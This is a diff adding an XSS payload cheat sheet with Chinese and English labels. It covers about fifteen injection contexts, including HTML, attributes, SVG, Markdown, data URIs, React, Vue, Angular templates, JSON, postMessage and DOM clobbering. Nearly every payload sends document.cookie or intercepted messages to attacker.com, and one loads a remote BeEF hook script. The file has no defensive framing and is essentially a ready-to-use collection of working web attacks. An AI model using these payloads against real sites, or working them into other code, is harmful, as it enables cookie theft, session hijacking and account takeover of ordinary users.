@@ -1,0 +1,30 @@
+# XSS HTML Context - script 注入加载 Remote JS
+<script src="http://attacker.com/beef.js"></script>
+# XSS Attribute Context - onerror 事件触发 Remote JS
+" onerror="fetch('http://attacker.com/'+document.cookie)" x="
+# XSS JavaScript Context - 闭合脚本标签注入
+</script><script>fetch('http://attacker.com/'+document.cookie)</script>
+# XSS HREF Context - javascript: 伪协议 + Remote JS
+<a href="javascript:fetch('http://attacker.com/'+document.cookie)">click</a>
+# XSS CSS Context - @import 外带数据
+</style><body onload=fetch('http://attacker.com/'+document.cookie)>
+# XSS SVG Context - 内联 script
+<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('http://attacker.com/'+document.cookie)</script></svg>
+# XSS Markdown Render - markdown 链接 + onerror
+[click](javascript:fetch('http://attacker.com/'+document.cookie))
+# XSS Data URI Context - data:image/svg 注入
+data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com/'+document.cookie)"/>
+# XSS React JSX - dangerouslySetInnerHTML 绕过
+<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>
+# XSS Vue.js - v-html 指令注入
+<div v-html="'<img src=x onerror=fetch(`http://attacker.com/'+document.cookie`)>'"></div>
+# XSS Angular (1.x) - $sanitize 绕过模板注入
+{{constructor.constructor('fetch(`http://attacker.com/`+document.cookie)')()}}
+# XSS Angular (2+) - DomSanitizer bypassSecurityTrustHtml
+<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>
+# XSS JSON Context - 闭合 JSON 字符串注入
+{"name":"</script><script>fetch('http://attacker.com/'+document.cookie)</script>"}
+# XSS PostMessage Context - 监听窃取跨域消息
+<script>window.addEventListener('message',function(e){new Image().src='http://attacker.com/'+btoa(e.data)})</script>
+# XSS DOM Clobbering - 表单元素劫持
+<form id="config"><input name="apiEndpoint" value="http://attacker.com/steal"></form><script>fetch(config.apiEndpoint.value+'?c='+document.cookie)</script>
